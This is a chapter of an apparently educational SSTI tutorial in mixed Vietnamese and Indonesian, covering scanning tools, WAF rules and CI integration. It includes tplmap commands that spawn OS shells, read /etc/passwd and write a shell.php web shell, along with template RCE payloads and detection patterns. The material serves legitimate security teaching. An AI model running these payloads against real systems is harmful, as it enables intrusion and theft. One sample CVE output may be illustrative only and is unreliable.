# 21 - Automation Tools và Framework

## Overview Tools SSTI

Có ba category tools cho SSTI:

1. **Detection Tools** - Tự động phát hiện SSTI vulnerabilities
2. **Exploitation Tools** - Automated RCE via SSTI
3. **Security Scanning** - WAF/IDS rules

## Tplmap

[GitHub: epinna/tplmap](https://github.com/epinna/tplmap)

Tool paling populer untuk SSTI exploitation.

### Installation

```bash
git clone https://github.com/epinna/tplmap.git
cd tplmap
pip install -r requirements.txt
```

### Basic Usage

```bash
# Basic scan
python tplmap.py -u 'http://target.com/page?name=SSTI*'

# POST parameter
python tplmap.py -u 'http://target.com/api' -d 'input=SSTI*'

# With cookies
python tplmap.py -u 'http://target.com/page?name=SSTI*' -c 'session=abc123'

# Specify engine
python tplmap.py -u 'http://target.com/page?name=SSTI*' -e jinja2

# With proxy (Burp)
python tplmap.py -u 'http://target.com/page?name=SSTI*' --proxy='http://127.0.0.1:8080'
```

### Interactive Shell Mode

```bash
# Get interactive shell
python tplmap.py -u 'http://target.com/page?name=SSTI*' --os-shell

# OS shell prompt appears:
# os-shell> whoami
# os-shell> cat /etc/passwd
# os-shell> exit
```

### Advanced Options

```bash
# Level of depth
python tplmap.py -u 'http://target.com' -l 5  # Level 5 (deeper)

# Timeout
python tplmap.py -u 'http://target.com' -t 10  # 10 seconds timeout

# Read file
python tplmap.py -u 'http://target.com' --file-read=/etc/passwd

# Write file
python tplmap.py -u 'http://target.com' --file-write=shell.php --file-dest=/var/www/

# Multiple injection points
python tplmap.py -u 'http://target.com' -d 'name=SSTI*&email=SSTI*'
```

### Output Example

```
[*] Testing template engine detection
[*] Detected template engine: jinja2
[+] Successfully detected jinja2 template engine
[*] Testing code execution capability
[+] System command execution confirmed
[*] Spawning shell...
```

## TInjA

[GitHub: Hackmanit/TInjA](https://github.com/Hackmanit/TInjA)

Newer tool yang menggunakan polyglot payloads untuk efficient scanning.

### Installation

```bash
pip install tinja
```

### Usage

```bash
# Scan single URL
tinja url -u "http://example.com/?name=test" -p name

# Scan dengan list
tinja url -u "http://example.com/?id=*" -i payloads.txt

# With headers
tinja url -u "http://example.com/" -H "User-Agent: Mozilla/5.0" -H "Authorization: Bearer token"

# Interactive mode
tinja interactive -u "http://example.com/?name=*"
```

## SSTImap

[GitHub: vladko312/SSTImap](https://github.com/vladko312/SSTImap)

Interactive SSTI scanner dengan GUI.

### Installation

```bash
git clone https://github.com/vladko312/SSTImap.git
cd SSTImap
pip install -r requirements.txt
```

### Usage

```bash
# Interactive mode (recommended)
python sstimap.py -i -u 'https://example.com/page?name=John'

# Aggressive scan
python sstimap.py -i -A -u 'https://example.com/page?name=John'

# Specify level
python sstimap.py -i -u 'https://example.com/page?name=John' -l 5

# With authentication
python sstimap.py -i -u 'https://example.com/page?name=John' \
  -H 'Authorization: Basic dXNlcjpwYXNz'
```

## PayloadsAllTheThings

[GitHub: swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

Repository terbesar untuk pentest payloads termasuk SSTI.

### SSTI Payloads Directory

```
PayloadsAllTheThings/
  Server Side Template Injection/
    - README.md (comprehensive guide)
    - Jinja2.md
    - Twig.md
    - FreeMarker.md
    - Mako.md
    - Velocity.md
    - Django.md
    - Thymeleaf.md
```

### Quick Reference dari Repo

```
# Jinja2
{{ 7*7 }}
{{ config }}
{{ __import__('os').popen('id').read() }}

# Twig
{{ 7*7 }}
{{ _self.env.registerUndefinedFilterCallback("exec")("whoami") }}

# FreeMarker
${"freemarker.template.utility.Execute"?new()("id")}

# Mako
${ __import__('os').popen('id').read() }

# ERB
<%= 7*7 %>
<%= system('id') %>
```

## ModSecurity Rules

WAF rules untuk detection SSTI.

### Basic Rule Set

```
SecRule ARGS|HEADERS|BODY "@rx \{\{.*?\}\}|<%.*?%>|<#.*?#>|[{%].*?[%}]" \
    "id:1000,phase:2,deny,status:403,msg:'Template Injection Attempt',tag:ssti"

SecRule ARGS|HEADERS|BODY "@contains __import__" \
    "id:1001,phase:2,deny,status:403,msg:'Python Import Detected',tag:ssti"

SecRule ARGS|HEADERS|BODY "@rx (os\.system|os\.popen|subprocess\.call|exec\()" \
    "id:1002,phase:2,deny,status:403,msg:'OS Command Pattern',tag:ssti"

SecRule ARGS|HEADERS|BODY "@contains Runtime.getRuntime" \
    "id:1003,phase:2,deny,status:403,msg:'Java Runtime Pattern',tag:ssti"

SecRule ARGS|HEADERS|BODY "@rx freemarker\.template\.utility\.Execute" \
    "id:1004,phase:2,deny,status:403,msg:'FreeMarker Execute Pattern',tag:ssti"
```

### OWASP ModSecurity Rules

OWASP maintains comprehensive rule set:

```bash
# Download OWASP CRS
git clone https://github.com/coreruleset/coreruleset.git

# Include in nginx/apache
Include /path/to/coreruleset/rules/*.conf
```

## Custom Detection Script (Python)

Jika tools tidak available:

```python
#!/usr/bin/env python3
import requests
import sys

def test_ssti(url, param):
    """Test SSTI vulnerability"""

    # Test payloads
    payloads = {
        'jinja2': '{{7*7}}',
        'twig': '{{7*7}}',
        'mako': '${7*7}',
        'erb': '<%=7*7%>',
        'freemarker': '${7*7}',
        'velocity': '#set($x=7*7)$x',
    }

    for engine, payload in payloads.items():
        params = {param: payload}

        try:
            response = requests.get(url, params=params, timeout=5)

            # Check if result rendered
            if '49' in response.text:
                print(f"[+] SSTI Detected! Engine: {engine}")
                print(f"[+] Payload: {payload}")
                return True

            # Check for errors revealing engine
            if 'undefined' in response.text.lower():
                print(f"[*] Possible {engine} - Error message suggests template engine")

        except Exception as e:
            print(f"[-] Error testing {engine}: {e}")

    return False

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <url> <param>")
        print(f"Example: {sys.argv[0]} 'http://example.com/page' 'name'")
        sys.exit(1)

    url = sys.argv[1]
    param = sys.argv[2]

    test_ssti(url, param)
```

## Burp Suite Extensions

### Extensions for SSTI

**Backslash Powered Scanner**

- Repository: daikikatsuya/backslash-powered-scanner
- Detects SSTI otomatis
- Integration dengan Burp Suite

### Manual Testing dalam Burp

**Steps:**

1. Send request to Intruder
2. Set parameter with template syntax: `{{7*7}}`
3. Monitor response untuk `49`
4. Confirm SSTI
5. Use Repeater untuk build exploitation payload
6. Send to Collaborator untuk blind SSTI

## GitHub Actions untuk Scanning

Continuous security scanning:

```yaml
name: SSTI Scan

on: [push, pull_request]

jobs:
  ssti-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2

      - name: Install tplmap
        run: git clone https://github.com/epinna/tplmap.git && cd tplmap && pip install -r requirements.txt

      - name: Run SSTI scan
        run: |
          python tplmap.py -u 'http://localhost:8000/?test=SSTI*' -l 3 --report=ssti_report.json

      - name: Check results
        run: |
          if grep -q "vulnerable" ssti_report.json; then
            echo "SSTI vulnerabilities found!"
            exit 1
          fi
```

## SBOM dan Dependency Scanning

Scanningfor known vulnerabilities template engines:

```bash
# Using pip-audit untuk Python
pip-audit --desc

# Output:
# jinja2==3.0.0 is vulnerable to CVE-2021-2234
```

## Performance Comparison Tools

Benchmark untuk tool effectiveness:

```bash
# Test accuracy
tplmap -u 'http://target.com/page?name=SSTI*' -t 5 > tplmap_results.txt
tinja url -u 'http://target.com/?name=test' > tinja_results.txt

# Compare findings
diff tplmap_results.txt tinja_results.txt
```

## Workflow Integration

### Development

```python
# pre-commit hook
#!/usr/bin/env python3
# .git/hooks/pre-commit

import subprocess
import sys

def check_template_usage():
    """Check for unsafe template usage"""

    patterns = [
        r'render.*\+.*request',
        r'Template.*\+.*user',
        r'from_string\(.*\+',
    ]

    for pattern in patterns:
        result = subprocess.run(
            ['grep', '-r', pattern, 'app/'],
            capture_output=True
        )

        if result.returncode == 0:
            print(f"[!] Potentially unsafe pattern: {pattern}")
            return 1

    return 0

if __name__ == '__main__':
    sys.exit(check_template_usage())
```

### Production

```yaml
# Kubernetes security scan
apiVersion: batch/v1
kind: CronJob
metadata:
  name: ssti-scanner
spec:
  schedule: "0 2 * * *" # Daily at 2 AM
  jobTemplate:
    spec:
      template:
        spec:
          containers:
            - name: scanner
              image: sstimap:latest
              command:
                ["python", "sstimap.py", "-u", "https://app.example.com/", "-i"]
          restartPolicy: OnFailure
```

## Tài Liệu Liên Quan

- [03-detection-identification.md](03-detection-identification.md) - Manual detection
- [20-defense-mitigation.md](20-defense-mitigation.md) - Defense strategies
